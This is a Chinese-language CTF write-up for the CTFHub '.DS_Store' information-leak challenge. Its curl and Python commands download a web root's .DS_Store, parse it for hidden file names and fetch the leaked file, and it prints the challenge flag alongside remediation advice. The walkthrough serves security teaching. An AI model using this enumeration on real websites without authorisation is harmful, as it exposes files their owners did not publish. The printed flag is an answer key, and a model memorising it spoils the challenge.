CTFHub - Web - 信息泄露 - 备份文件下载 - .DS_Store

# CTFHub # Web # 信息泄露 # 备份文件下载 # .DS_Store # macOS

一、题目信息

  • 题目名称：.DS_Store
  • 题目方向：Web - 信息泄露 - 备份文件下载
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目提示：.DS_Store 是 macOS 保存文件夹自定义属性的隐藏文件，可能包含当前目录的文件清单。

二、漏洞原理

macOS Finder 在浏览目录时可能生成 .DS_Store 文件，用于保存图标位置、排序方式等目录元数据。该文件通常还会记录目录中的文件名。

如果网站部署时误将 .DS_Store 发布到 Web 根目录，服务器会把它当作普通静态文件返回。攻击者可以下载该文件并解析其中的记录，从而发现未在页面中公开的文件名或其他目录线索。

三、解题工具

  • 浏览器：查看题目提示。
  • cURL：下载 .DS_Store 和其中记录的文件。
  • Python：使用 ds_store 库解析 .DS_Store。

四、解题步骤

  1. 访问题目：页面标题为 CTFHub BackUp DS_Store，正文提示寻找 Flag。
  2. 下载隐藏文件：直接请求 Web 根目录下的 .DS_Store，响应返回 200 OK 和 application/octet-stream： 
    curl.exe -sS "http://challenge-xxx.sandbox.ctfhub.com:10800/.DS_Store" -o .DS_Store
  3. 确认文件格式：文件大小为 16388 字节，头部包含 Bud1 特征，属于 macOS Desktop Services Store 文件，不是普通文本。
  4. 解析目录记录：安装解析库后遍历文件中的记录： 
    python -m pip install ds_store

python -c "from ds_store import DSStore; d=DSStore.open('.DS_Store'); [print(e.filename, e.code, e.type, e.value) for e in d]; d.close()"
    得到隐藏文件名和对应备注： 
    ('6a224c3de890b87f210914b8e001b79f.txt', b'note', b'ustr', 'flag here!')
  5. 访问泄露文件：使用解析出的文件名请求目标地址： 
    curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/6a224c3de890b87f210914b8e001b79f.txt"
    响应正文即为 Flag。

五、最终 Flag

ctfhub{fc1ccead4d74406421fbbd48}

六、修复建议

  • 发布网站前检查构建产物，确保不会打包 .DS_Store、Thumbs.db 等系统隐藏文件。
  • 在 Web 服务器或反向代理中禁止访问以 . 开头的文件和敏感备份文件。
  • 使用自动化构建与部署流程，只发布明确需要的静态资源，避免直接暴露开发目录。
  • 目录清单、内部文件名和调试备注不应作为公开资源部署到生产环境。

七、解题总结

本题的关键是先通过 /.DS_Store 获取目录文件清单，再访问其中记录的隐藏文本文件。题目中的 note 记录还提供了 flag here! 提示，但真正的 Flag 内容位于该记录对应的文件中。
